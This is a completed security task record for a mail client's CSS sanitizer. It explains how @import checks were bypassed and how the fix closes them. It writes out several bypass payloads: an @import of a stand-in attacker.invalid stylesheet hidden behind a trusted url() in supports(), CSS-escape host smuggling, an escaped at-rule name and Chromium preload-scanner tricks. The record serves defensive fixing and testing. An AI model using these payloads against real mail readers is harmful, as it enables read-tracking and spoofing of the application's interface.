---
id: TASK-132
title: Check font import targets against trusted font hosts
status: Done
assignee: []
created_date: '2026-10-10 05:32'
updated_date: '2026-10-10 07:32'
labels:
  - security
dependencies: []
references:
  - ownmail/sanitizer/worker.js
  - tests/test_sanitizer.py
  - tests/test_reader_body_style.py
priority: medium
type: bug
ordinal: 9880
---

## Description

<!-- SECTION:DESCRIPTION:BEGIN -->
scopeAndSanitizeCSS (ownmail/sanitizer/worker.js) keeps an @import only when isTrustedFontUrl approves its prelude. isTrustedFontUrl checks the first url() token anywhere in the prelude and falls back to the first quoted string, so a url() inside a supports() condition is checked instead of the import target. The worker keeps this rule with the untrusted target intact:

```css
@import "https://attacker.invalid/style.css" supports(background: url("https://<host in TRUSTED_FONT_HOSTS>/"));
```

While remote content is blocked, IMAGE_BLOCKING_CSP refuses the stylesheet and _css_has_remote_urls still offers the remote-content prompt. Once remote content is loaded or the sender is trusted, a stylesheet from any host loads. It is not scoped to the message, so it can restyle application UI, and its fetch tells the remote host the message was opened. MESSAGE_CSP still blocks scripts.

Check the import target itself: take the first prelude component (a url() or a string) and require a TRUSTED_FONT_HOSTS host. A url() in a supports(), layer() or media condition must never satisfy the check.
<!-- SECTION:DESCRIPTION:END -->

## Acceptance Criteria
<!-- AC:BEGIN -->
- [x] #1 An @import is kept only when its target, the first prelude component, is a url() or string naming a TRUSTED_FONT_HOSTS host; a url() in a supports(), layer() or media condition never satisfies the check.
- [x] #2 Trusted imports in url() and quoted-string form, with or without a media query, are still kept, and untrusted targets are still removed.
- [x] #3 A test_sanitizer regression with the synthetic supports() import above fails against the current isTrustedFontUrl and passes after the fix.
- [x] #4 The full pre-push gate passes.
<!-- AC:END -->

## Implementation Notes

<!-- SECTION:NOTES:BEGIN -->
- Each `@import` is judged by its prelude as printed, read with the CSS Syntax 3 tokenizer that TASK-131 added. Browsers load only the first component, a string or `url()`, so only that target is checked. A comment inside an unquoted `url()` makes the target a relative URL, and postcss drops such comments from `params`, so `url( /*x*/https://fonts.googleapis.com/x.css)` is refused. `isTrustedFontUrl` now only checks a host, and the `<link>` hook reuses it.
- postcss and browsers can split the same text into different rules. postcss reads `/*` inside `url( …)` or `URL(…)` as a comment and continues strings past a newline, so a trusted first import could hide a second `@import` that only browsers read. The final stylesheet is therefore tokenized again as browsers read it, next to the TASK-131 scope check. Any `@import` found there with an untrusted target discards the whole stylesheet (`/* CSS parse error */`), the same policy as TASK-131. Position is not checked; an `@import` that browsers ignore must still name a trusted host.
- Chromium's HTML preload scanner fetches `@import` targets by simpler rules than its CSS parser: it ends a `url()` or string at `;` and does not decode escapes. In Chromium, `@import 'trusted' url(;@import url(untrusted);` and `@import url(trusted) supports(content: ";@import url(untrusted)")` requested the untrusted URL, although the CSS parser loads nothing from it. "@import" text may therefore appear in the output only where an `@import` rule starts, and a kept target may not contain an escape. Comments that mention `@import` are removed, so a commented-out import does not discard the stylesheet; "@import" inside a string, such as `content: "@import"`, does. WebKit's scanner requested nothing extra in the same cases. Firefox was not checked.
- Checked in Chromium and WebKit: `\40 ` decodes to `@`, so `"https://fonts.googleapis.com\40 untrusted.invalid/x.css"` loads from `untrusted.invalid`. Escaped targets are refused.
- Within AC #1: postcss ends an at-rule name at a backslash, but browsers decode the escape, so `@imp\6f rt url(...)` is an `@import` with any target. At-rules whose name is followed directly by a backslash are removed. Legitimate mail does not escape at-rule names.
- Tests: `test_sanitizer` covers kept and removed forms and imports hidden by each parser difference above. `test_reader_body_style` renders the reader with remote content loaded, routes every request, and asserts that only a trusted font host is requested and the toolbar stays visible. Before the browser-view check, Chromium requested the untrusted stylesheet in five of its six hidden-import cases (the escaped `url(` case was already dropped). In a random differential check of 12,000 generated stylesheets, the fixed worker produced no untrusted request in Chromium or WebKit, while the previous worker leaked in about 3% of them.
<!-- SECTION:NOTES:END -->
